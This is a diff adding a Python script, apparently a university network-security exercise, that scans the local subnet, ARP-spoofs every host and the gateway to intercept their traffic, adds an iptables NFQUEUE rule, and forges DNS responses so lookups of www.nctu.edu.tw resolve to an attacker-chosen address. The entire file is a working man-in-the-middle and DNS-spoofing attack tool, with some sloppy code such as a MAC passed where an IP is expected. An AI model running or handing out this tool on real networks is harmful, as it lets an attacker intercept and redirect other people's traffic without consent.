@@ -1,0 +1,99 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+import scapy.all as scapy
+import netifaces
+from scapy.layers.http import *
+import re,os,time,sys
+import netfilterqueue
+def process_packet(packet):
+	print(packet)
+	packet.accept()
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast,
+    timeout=1, verbose=False)[0]
+    return (answered_list[0][1].hwsrc)
+def spoof(target_ip, spoof_ip,tmac): 
+    packet = scapy.ARP(op=2, pdst=target_ip,
+    hwdst=tmac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+    hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+def spoof_packet(packet):
+    dns_packet = scapy.IP(packet.get_payload())
+    if dns_packet.haslayer(scapy.DNSRR):
+        qname = dns_packet[scapy.DNSQR].qname
+        if "www.nctu.edu.tw" in qname:
+            spf_ans = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
+            dns_packet[scapy.DNS].an = spf_ans
+            dns_packet[scapy.DNS].ancount = 1
+            del dns_packet[scapy.IP].len
+            del dns_packet[scapy.IP].chksum
+            del dns_packet[scapy.UDP].len
+            del dns_packet[scapy.UDP].chksum
+            packet.set_payload(str(dns_packet))
+    packet.accept()
+def get_local_ip_address():
+    try:
+        import netifaces
+    except ImportError:
+        try:
+            command_to_execute = "pip install netifaces || easy_install netifaces"
+            os.system(command_to_execute)
+        except OSError:
+            print "Can NOT install netifaces, Aborted!"
+            sys.exit(1)
+        import netifaces
+    routingIPAddr = '127.0.0.1'
+    for interface in netifaces.interfaces():
+        if interface == netifaces.gateways()['default'][netifaces.AF_INET][1]:
+            routingIPAddr=str(netifaces.gateways()['default'][netifaces.AF_INET][0])
+    return routingIPAddr
+os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
+a=get_local_ip_address()
+a=str(a)
+ans = scapy.arping(a+"/24",verbose=0)[0]
+rmac=get_mac(a)
+for element in ans:
+    print (element[1].psrc+ "\t\t" +element[1].hwsrc)
+for element in ans:
+    if (rmac!=element[1].hwsrc):
+        #print element[1].psrc
+        spoof(a,element[1].hwsrc,rmac)
+        spoof(element[1].psrc,a,element[1].hwsrc)
+try:
+    while True:
+        for element in ans:
+            if (rmac!=element[1].hwsrc):
+                spoof(a,element[1].psrc,rmac)
+                spoof(element[1].psrc,a,element[1].hwsrc)
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, spoof_packet)
+        queue.run()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ....")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#--------------------------------------------------------------------------#
